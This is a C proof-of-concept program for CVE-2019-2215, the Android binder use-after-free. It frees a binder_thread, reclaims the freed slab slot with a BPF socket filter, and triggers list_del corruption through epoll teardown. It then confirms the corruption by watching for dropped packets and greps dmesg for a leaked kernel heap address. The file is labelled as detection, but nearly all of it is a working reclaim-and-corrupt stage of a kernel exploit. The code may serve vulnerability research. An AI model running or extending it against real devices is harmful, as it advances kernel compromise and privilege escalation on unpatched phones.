/*
 * bpf_detect2.c — BPF corruption detection for CVE-2019-2215 (v2)
 *
 * Correct sequence:
 * 1. Pre-create UDP socket (no BPF yet)
 * 2. Open binder, epoll_ctl ADD → creates binder_thread on thread->wait
 * 3. BINDER_THREAD_EXIT → frees binder_thread (slot on per-CPU freelist)
 * 4. IMMEDIATELY: SO_ATTACH_FILTER on the UDP socket → BPF filter
 *    reclaims the freed slot (SLUB LIFO)
 * 5. close(epfd) → remove_wait_queue → list_del at freed binder_thread's
 *    address → corrupts BPF instruction data at offsets 48-55
 * 6. Send packet to UDP socket → corrupted filter drops it → DETECTED
 * 7. Check dmesg for WARN_RATELIMIT with heap address in 'k' field
 *
 * The BPF program is designed so insns[3].k (offset 48-51) is critical:
 * a conditional jump that accepts or drops based on k value.
 *
 * Build: .\qemu\build-arm.bat src\bpf_detect2.c bpf_detect2
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

static int do_test(int attempt) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* === STEP 1: Pre-create UDP socket (no BPF) === */
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { printf("  socket: %s\n", strerror(errno)); return -1; }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(0);
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));

    socklen_t alen = sizeof(addr);
    getsockname(sock, (struct sockaddr*)&addr, &alen);

    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 }; /* 50ms timeout */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    int sender = socket(AF_INET, SOCK_DGRAM, 0);

    /* === STEP 2: Open binder + epoll (NO BC_ENTER_LOOPER) === */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { printf("  binder: %s\n", strerror(errno)); close(sock); close(sender); return -1; }

    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    /* binder_poll creates binder_thread with looper=NEED_RETURN
     * → wait_for_proc_work=FALSE → epoll entry on thread->wait */

    /* === STEP 3: BINDER_THREAD_EXIT → free binder_thread === */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    /* === STEP 4: IMMEDIATELY attach BPF → reclaims freed slot ===
     *
     * BPF program: insns[3] is JEQ k=0. If A==0 (always true),
     * skip to ACCEPT. Corruption changes k → jump fails → DROP.
     *
     * Layout in sk_filter:
     *   +0:  refcnt (4)
     *   +4:  len (4)
     *   +8:  bpf_func (4)
     *   +12: rcu_head (8)
     *   +20: insns[0] (8)  ... insns[3] at +44, insns[4] at +52
     *
     * list_del writes to offsets 48 (insns[3].k) and 52 (insns[4].code+jt+jf)
     */
    struct sock_filter insns[26];
    /* insns[0-2]: set A=0 */
    for (int j = 0; j < 3; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    /* insns[3]: JEQ k=0, jt=21 (→insns[25]=ACCEPT), jf=0 (→insns[4]=DROP) */
    insns[3].code = BPF_JMP | BPF_JEQ | BPF_K;
    insns[3].jt = 21;  /* skip to insns[25] if true */
    insns[3].jf = 0;   /* fall through to insns[4] if false */
    insns[3].k = 0;     /* compare with 0 — CRITICAL: corruption changes this */

    /* insns[4]: DROP (reached only if JEQ fails) */
    insns[4].code = BPF_RET | BPF_K;
    insns[4].jt = 0; insns[4].jf = 0; insns[4].k = 0; /* return 0 = drop */

    /* insns[5-24]: padding (never reached) */
    for (int j = 5; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    /* insns[25]: ACCEPT */
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;

    struct sock_fprog prog = { .len = 26, .filter = insns };
    int r = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    if (r < 0) {
        printf("  attach filter: %s\n", strerror(errno));
        close(sock); close(sender); close(bfd); close(epfd);
        return -1;
    }

    /* Verify filter works before UAF trigger */
    char msg[] = "PRE_TEST";
    sendto(sender, msg, sizeof(msg), 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[64];
    ssize_t got = recv(sock, buf, sizeof(buf), 0);
    if (got <= 0) {
        printf("  [%d] WARN: pre-UAF recv failed (filter blocks before corruption)\n", attempt);
        close(sock); close(sender); close(bfd); close(epfd);
        return -1;
    }

    /* === STEP 5: close(epfd) → UAF → corrupts BPF at offsets 48-55 === */
    close(epfd);

    /* === STEP 6: Test — send packet, check if filter drops it === */
    char msg2[] = "POST_UAF";
    sendto(sender, msg2, sizeof(msg2), 0, (struct sockaddr*)&addr, sizeof(addr));
    ssize_t got2 = recv(sock, buf, sizeof(buf), 0);

    int corrupted = 0;
    if (got2 <= 0) {
        printf("  [%d] ✓ CORRUPTION DETECTED! Packet dropped by corrupted filter.\n", attempt);
        corrupted = 1;
    }

    close(sock);
    close(sender);
    close(bfd);
    return corrupted;
}

int main(int argc, char **argv) {
    int max_attempts = 200;
    if (argc > 1) max_attempts = atoi(argv[1]);

    printf("=== CVE-2019-2215 BPF Corruption Detection v2 ===\n");
    printf("Attempts: %d, PID=%d, CPUs=%ld\n\n", max_attempts, getpid(),
           sysconf(_SC_NPROCESSORS_ONLN));

    int detected = 0, errors = 0, crashes = 0;

    for (int a = 0; a < max_attempts; a++) {
        if (a % 50 == 0) {
            printf("  [%d/%d] detected=%d errors=%d crashes=%d\n",
                   a, max_attempts, detected, errors, crashes);
            fflush(stdout);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = do_test(a);
            _exit(r > 0 ? 42 : (r < 0 ? 1 : 0));
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) detected++;
            else if (WEXITSTATUS(status) == 1) errors++;
        } else if (WIFSIGNALED(status)) {
            printf("  [%d] CRASHED signal=%d\n", a, WTERMSIG(status));
            crashes++;
        }
    }

    printf("\n=== RESULTS ===\n");
    printf("  Attempts: %d\n", max_attempts);
    printf("  Detected: %d (%.1f%%)\n", detected, detected * 100.0 / max_attempts);
    printf("  Errors:   %d\n", errors);
    printf("  Crashes:  %d\n", crashes);

    if (detected > 0) {
        printf("\n  ✓ UAF CONFIRMED! BPF filter reclaim + corruption works.\n");
        printf("  Checking dmesg for heap address leak...\n");
        fflush(stdout);
        FILE *p = popen("dmesg | grep -i 'unknown.*code\\|sock.*filter' | tail -10", "r");
        if (p) {
            char line[512];
            while (fgets(line, sizeof(line), p))
                printf("  dmesg: %s", line);
            pclose(p);
        }
    }

    return detected > 0 ? 0 : 1;
}
